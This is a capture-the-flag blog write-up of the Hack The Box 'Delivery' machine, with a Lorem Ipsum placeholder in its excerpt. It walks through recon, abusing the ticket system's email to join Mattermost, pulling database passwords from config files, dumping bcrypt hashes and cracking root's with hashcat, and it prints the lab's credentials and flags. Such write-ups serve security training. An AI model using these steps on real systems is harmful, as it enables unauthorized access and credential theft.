---
layout: single
title: Delivery - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-delivery/delivery_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-delivery/delivery_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/delivery]# nmap -Pn -n -sCV 10.10.10.222 --open                                                                    (master✱)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[root:/git/htb/delivery]# nmap -p- 10.10.10.222                                                                                   (master✱)
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 09:30 CET
Nmap scan report for delivery.htb (10.10.10.222)
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown


DIRB:
==> DIRECTORY: http://10.10.10.222/assets/
==> DIRECTORY: http://10.10.10.222/error/
==> DIRECTORY: http://10.10.10.222/images/
+ http://10.10.10.222/index.html (CODE:200|SIZE:10850)

==> DIRECTORY: http://helpdesk.delivery.htb/api/
==> DIRECTORY: http://helpdesk.delivery.htb/apps/
==> DIRECTORY: http://helpdesk.delivery.htb/assets/
==> DIRECTORY: http://helpdesk.delivery.htb/css/
==> DIRECTORY: http://helpdesk.delivery.htb/images/
+ http://helpdesk.delivery.htb/index.php (CODE:200|SIZE:5010)
==> DIRECTORY: http://helpdesk.delivery.htb/js/
==> DIRECTORY: http://helpdesk.delivery.htb/kb/
==> DIRECTORY: http://helpdesk.delivery.htb/pages/
+ http://helpdesk.delivery.htb/web.config (CODE:200|SIZE:2197)

FFUF:
http://helpdesk.delivery.htb/FUZZ
  scp                     [Status: 301, Size: 185, Words: 6, Lines: 8]

NIKTO:
-

URLS:
http://10.10.10.222:8065/login    # Mattermost login
http://helpdesk.delivery.htb/
http://helpdesk.delivery.htb/scp/login.php


2. Looking on http://10.10.10.222 we are greeted with the text;
>  "The best place to get all your email related support
>  For an account check out our helpdesk"

Hovering over 'helpdesk' we see that it's a link to 'helpdesk.delivery.htb', add that to /etc/hosts.

Continuing and press on 'Contact Us' and we get the text;
> "For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server."

Hovering over 'MatterMost' we see a link to 'http://10.10.10.222:8065/login'.

With this information, we should probably go to helpdesk.delivery.htb, create a @delivery.htb email and then go to
their MatterMost server.


3. Create a support ticket.

Open a New Ticket >
Email: asdfasdf@test.test
Name: tester
Topic: Contact Us
Issue: test
Text: test

> Support ticket request created
> tester,
> You may check the status of your ticket, by navigating to the Check Status page using ticket id: 8820668.
> If you want to add more information to your ticket, just email 8820668@delivery.htb.
> Thanks,
> Support Team

View the ticket by entering email 'asdfasdf@test.test' and ticket id '8820668'


4. My thought process here is that we should create a ticket, and thus also creating a XXXXX@delivery.htb email account.
When creating a ticket we get the info "to add more information to your ticket, just email XXXXX@delivery.htb". Maybe
we can send a password reset from MatterMost to XXXXX@delivery.htb, and the info will be added to our ticket?

Create a new MatterMost account;
Email: 8820668@delivery.htb
Name: pThree
Pass: Test123!"#

> "Please verify your email address. Check your inbox for an email."

Refresh the ticket tab and we see the email confirmation from MatterMost telling us to verify the account;
http://delivery.htb:8065/do_verify_email?token=cjsxt4u5abci6g95jfua8fwmjte88grawe3qis19f6pi45fpioc6mgxaz4fe7i6h&email=8820668%40delivery.htb

Once logged in to MatterMost we see a message from root asking the devs to update OSTicket, and the credentials:
maildeliverer:Youve_G0t_Mail!

Root also says:
"Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!""
"PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases."


5. Login with maildeliverer:Youve_G0t_Mail! and grab user.txt

[root:/git/htb/delivery]# ssh maildeliverer@delivery.htb
maildeliverer@Delivery:~$ cat user.txt
  618f481b170b20451b8d430948d2a988


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Upload and run linpeas

maildeliverer@Delivery:/dev/shm$ ./linpeas.sh
  --- snip ---
  root       654  0.0  0.1  29208  8004 ?        Ss   04:33   0:00 /usr/sbin/cupsd -l
  root       886  0.0  0.4  29536 18000 ?        S    04:34   0:00 python3 /root/py-smtp.py
  --- snip ---
  [+] Active Ports
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
  tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
  tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
  --- snip ---
  [+] Backup files?
  -rwxr-xr-x 1 root root 38412 Nov 25 04:50 /usr/bin/wsrep_sst_mariabackup

linpeas dosn't find anything real interesting. We see port 3306 (MariaDB), 631 (CUPSD) and 1025 (SMTP) running locally.
MariaDB and SMTP makes sense, as the service had a mailserver and probably stores the tickets, accounts etc in a database.
CUPSD is for me unknown, so we go ahead a try to look for database information.


maildeliverer@Delivery:/var/www/osticket/upload/include$ cat ost-config.php
  --- snip ---
  # Encrypt/Decrypt secret key - randomly generated during installation.
  define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');

  #Default admin email. Used only on db connection issues and related alerts.
  define('ADMIN_EMAIL','maildeliverer@delivery.htb');

  # Database Options
  # ---------------------------------------------------
  # Mysql Login info
  define('DBTYPE','mysql');
  define('DBHOST','localhost');
  define('DBNAME','osticket');
  define('DBUSER','ost_user');
  define('DBPASS','!H3lpD3sk123!');

  # Table prefix
  define('TABLE_PREFIX','ost_');

maildeliverer@Delivery:/var/www/osticket/upload/include$ mariadb -h localhost -D osticket -u ost_user -p
  Enter password: !H3lpD3sk123!
  MariaDB [osticket]>
  MariaDB [osticket]> DESCRIBE ost_user_account;
    +------------+------------------+------+-----+---------------------+----------------+
    | Field      | Type             | Null | Key | Default             | Extra          |
    +------------+------------------+------+-----+---------------------+----------------+
    | id         | int(11) unsigned | NO   | PRI | NULL                | auto_increment |
    | user_id    | int(10) unsigned | NO   | MUL | NULL                |                |
    | status     | int(11) unsigned | NO   |     | 0                   |                |
    | timezone   | varchar(64)      | YES  |     | NULL                |                |
    | lang       | varchar(16)      | YES  |     | NULL                |                |
    | username   | varchar(64)      | YES  | UNI | NULL                |                |
    | passwd     | varchar(128)     | YES  |     | NULL                |                |
    | backend    | varchar(32)      | YES  |     | NULL                |                |
    | extra      | text             | YES  |     | NULL                |                |
    | registered | timestamp        | YES  |     | current_timestamp() |                |
    +------------+------------------+------+-----+---------------------+----------------+
    10 rows in set (0.001 sec)

  MariaDB [osticket]> SELECT id,user_id,username,passwd FROM ost_user_account;
    +----+---------+----------+--------------------------------------------------------------+
    | id | user_id | username | passwd                                                       |
    +----+---------+----------+--------------------------------------------------------------+
    |  1 |       7 | NULL     | $2a$08$rgQoa/Pwz1tb6ppfKhmtTunPOzVz2flI7JQ.Hb2DY5zBQfCylQJjq |
    |  2 |       8 | NULL     | $2a$08$kz/5w9eI.e2VRCZeaep3U.a5.i.a6cXYfPeNQ0CmnmEHwHAjzS3ve |
    |  3 |       9 | NULL     | $2a$08$YkHXzo9yIxEUjOs583X/jucqrwtGazzXQmGMHBRM4NZ2.WGMH2OZq |
    |  4 |      10 | NULL     | $2a$08$KrtpXlS/qC2bFa410TV17eEu7bMBUWSOJXyXv6F0aiI9ABrDRP07q |
    |  5 |      11 | NULL     | $2a$08$skz09GR4/zJ.JLwlKmMbueyvQRYoV3wocPeGNuC8.PDXHvdFS2cHW |
    +----+---------+----------+--------------------------------------------------------------+

  MariaDB [osticket]> SELECT username,passwd FROM ost_staff;
    +---------------+--------------------------------------------------------------+
    | username      | passwd                                                       |
    +---------------+--------------------------------------------------------------+
    | maildeliverer | $2a$08$VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy |
    +---------------+--------------------------------------------------------------+

All hashes are for user accounts on /var/www, no need to crack them.


2. Lets move on and see if we can find any hashes from the MatterMost service.

maildeliverer@Delivery:/opt/mattermost/config$ cat config.json
"ServiceSettings": {
  --- snip ---
  "GfycatApiKey": "2_KtH_W5",
  "GfycatApiSecret": "3wLVZPiswc3DnaiaFoLkDvB4X0IV6CpMkj4tf2inJRsBY6-FnkT08zGmppWFgeof",
"SqlSettings": {
  "DriverName": "mysql",
  "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
  "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
"FileSettings": {
  --- snip ---
  "PublicLinkSalt": "8818u8uiz1n9rykuwgiqttfzgu6iixhz",


The obvious credentials 'mmuser:Crack_The_MM_Admin_PW' points towards MySQL/MariaDB port 3306, lets login and see if
we can grab the admin hash.

maildeliverer@Delivery:/opt/mattermost/data$ mysql -h localhost -u mmuser -p
MariaDB [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | mattermost         |
  +--------------------+
MariaDB [mattermost]> SELECT Username,Password FROM Users;
  +----------------------------------+--------------------------------------------------------------+
  | Username                         | Password                                                     |
  +----------------------------------+--------------------------------------------------------------+
  | surveybot                        |                                                              |
  | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
  | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
  | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
  | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
  | channelexport                    |                                                              |
  | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
  +----------------------------------+--------------------------------------------------------------+

The hashes looks like bcrypt, so we use mode 3200 for cracking.
https://hashcat.net/wiki/doku.php?id=example_hashes

3. We probably only need the root hash, however I save all of them. Setup hashcat and start cracking!

From the hints in MatterMost earlier, one part of the password is probably 'PleaseSubscribe!', we can easily try this
with a mask attack - working our way up one letter at the time.

root@nidus:/git/htb/delivery# hashcat -m3200 root.hash -a3 PleaseSubscribe?a?a?a
  --- snip ---
  $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

  Session..........: hashcat
  Status...........: Cracked

Another maybe solution would be to use rules;
[root:/git/htb/delivery]# hashcat -a0 -m3200 root.hash PleaseSubscribe.txt -r d3adhob0.rule

maildeliverer@Delivery:/opt/mattermost/data$ su
  Password: PleaseSubscribe!21
root@Delivery:/opt/mattermost/data# cat /root/root.txt
  4162b5f3180d82b27627f957f4664c2c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Hashcat Mask Attack:
  https://hashcat.net/wiki/doku.php?id=mask_attack#examples
